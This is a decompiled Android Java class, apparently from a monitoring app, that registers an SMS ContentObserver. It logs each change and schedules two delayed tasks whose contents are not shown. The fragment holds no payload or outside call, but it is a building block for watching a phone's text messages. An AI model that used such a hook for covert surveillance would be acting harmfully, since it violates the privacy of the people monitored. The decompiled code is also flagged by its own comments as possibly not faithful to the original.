package com.network.android.monitor.observer;

import android.content.Context;
import android.database.ContentObserver;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class o extends ContentObserver {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f100a;
    final /* synthetic */ n b;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    o(n nVar, Context context) {
        super(null);
        this.b = nVar;
        this.f100a = context;
    }

    public final void onChange(boolean z) {
        a.a("Sms ContentObserver onChange: " + z);
        this.b.e.postDelayed(new p(this), 2000);
        this.b.e.postDelayed(new q(this), 3000);
    }
}
